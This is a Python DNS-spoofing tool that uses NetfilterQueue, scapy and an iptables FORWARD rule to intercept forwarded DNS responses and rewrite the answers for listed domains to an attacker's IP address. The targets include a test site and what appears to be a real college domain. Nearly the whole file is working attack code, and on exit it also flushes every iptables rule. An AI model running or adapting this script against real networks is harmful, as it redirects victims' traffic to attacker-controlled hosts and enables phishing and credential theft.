"""
First install netfilterqueue  on your linux machine
sudo apt-get install build-essential python3-dev libnetfilter-queue-dev

Then install the library for python3
python3 -m pip install NetFilterQueue
"""
import os

import netfilterqueue
from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR

# definations for /etc/hosts file which is local cache converted in binary by b
dns_hosts = {
    b'testphp.vulnweb.com.': "192.168.100.10",    # Enter the domains and ip address to poison the dns records here according to you
    b'adcet.ac.in.': "192.168.100.10"
}
"""
this above code has defined a host file such that whenever the user Generates DNSQR with  testphp.vulnweb.com with this url 
it will get my ip resolved 192.168.100.10 here as DNSRR
"""


def process_packet(packet):
    """ The packet that will come from queue here is not scapy so we need to convert it first"""
    # there ip header in netfilterqueue packet so we need to convert it to ip so that scapy can read
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname  # to understand about query
        print("[+]Before: {}".format(qname.decode()))  # qname.decode will show for which thing request is made or simply dns query
        """
        user can make any requests so we dont want to modify them all we have to modify particulars that are above mentioned
        """
        try:
            scapy_packet = modify_packet(scapy_packet)
        except Exception as e:
            print("[!] Exception during packet modification:", e)
            # Handle the exception (e.g., log it or take appropriate action)


        packet.set_payload(bytes(scapy_packet))

    packet.accept()  # the above thing only sets the packet in the queue from scapy format to normal so we have to send



def modify_packet(scapy_packet):
    qname = scapy_packet[DNSQR].qname  # fetching qname

    if qname not in dns_hosts:  # checking if qname is there in dns_host if present then only modify
        print("[!]no modification required... ")
        return scapy_packet

    # for instance , google.com will mapped  to 192.168.100.10
    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    scapy_packet[DNS].ancount = 1
    # Delete checksum and length of packet , because we have modified the packet
    # new calculations are required (scapy will do automatically)
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum
    # return the modified packet
    print("[After ]:", dns_hosts[qname])
    return scapy_packet


QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -jNFQUEUE --queue-num {}".format(QUEUE_NUM))

nfq = NetfilterQueue()

try:
    nfq.bind(QUEUE_NUM, process_packet)
    nfq.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
